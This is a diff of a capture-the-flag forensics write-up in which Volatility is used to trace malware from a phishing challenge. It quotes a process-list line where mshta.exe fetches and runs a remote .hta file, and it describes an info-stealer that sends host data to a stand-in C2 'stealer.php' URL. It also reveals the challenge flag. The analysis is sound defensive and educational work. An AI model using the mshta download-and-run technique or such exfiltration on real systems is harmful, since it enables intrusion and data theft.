@@ -6,13 +6,13 @@
 This challenge uses the same dump as *Phantom Phish*, and wants us to investigate some malware likely arising from the phishing attempt from that challenge.
 
 The notepad process opened the pdf file around `2024-10-17 13:08:33.000000`, so we could be looking for a malware-process close to this timestamp. If we look through the process-list again, this `mshta.exe` process stands out as it reaching out for a `.hta` file from a remote server. `mshta` is a [LOLBIN](https://lolbas-project.github.io/lolbas/Binaries/Mshta/) which can be used to download and execute html applications.
-```console
+```
 PID     PPID    ImageFileName   CreateTime      Audit   Cmd
 5696       10348   mshta.exe       2024-10-17 13:07:14.000000      \Device\HarddiskVolume3\Windows\System32\mshta.exe      "C:\Windows\system32\mshta.exe" http://192.168.88.130/heist.hta
 ```
 
 Using `windows.filescan.FileScan` and `windows.dumpfiles.DumpFiles` we can dump this `heist.hta` file from memory. If this had not worked we could also have retrieved the file by dumping the memory of the `mshta.exe` process, and then carve the hta file out of its memory, but this is a little more tedious.
-```console
+```
 $ vol3 -f dump.dmp windows.filescan.FileScan | grep "\.hta"
 
 Offset  Name    Size
@@ -108,5 +108,4 @@ dtg = "5667474c4b0761534c54614e63432368700722594c40275b7f0467687b04220267166e"
 d2 = hbr(dtg, &H1337)
 ```
 
-
-Which results in the flag `EPT{X0rd_crypt0_c01n_w4ll3t_h315t!}` when decrypted! The actual functionality of this script is to collect computer information from the registry and environment variables, and send it to `https://helixpewtersecretc2.ept/stealer.php`:
+This results in the flag `EPT{X0rd_crypt0_c01n_w4ll3t_h315t!}` when decrypted! The actual functionality of this script is to collect computer information from the registry and environment variables, and send it to `https://helixpewtersecretc2.ept/stealer.php`:
